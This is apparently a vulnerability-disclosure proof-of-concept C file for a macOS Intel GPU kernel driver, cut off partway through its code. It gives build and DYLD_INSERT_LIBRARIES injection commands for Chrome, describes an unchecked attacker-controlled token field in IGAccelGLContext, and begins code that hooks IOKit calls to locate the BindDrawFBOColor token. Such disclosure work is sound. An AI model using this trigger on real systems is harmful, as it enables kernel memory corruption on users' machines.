/*
build this dylib:
$ clang -Wall -dynamiclib -o ig_gl_BindDrawFBOColor.dylib ig_video_main_BindDrawFBOColor.c -framework IOKit -arch i386 -arch x86_64

load it into chrome:
$ DYLD_INSERT_LIBRARIES=./ig_gl_BindDrawFBOColor.dylib /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

if the bug doesn't trigger, navigate to a website which uses webgl, eg:
  http://damienmortini.me.uk/house/

BUG:
The function IGAccelGLContext::process_token_BindDrawFBOColor fails to bounds check the dword at offset 0x10 of the
BindDrawFBOColor token - this value is read from user/kernel shared memory and is thus completely attacker controlled.
...
{ 
  ...
  if (selector == 2 && connection == port){
    ...
    if (token_buf != 0){
      ...
      uint16_t BindDrawFBOColor = 0x9100;
      uint32_t* tok = memmem(token_buf, token_buf_size, &BindDrawFBOColor, 2);
      if (tok){
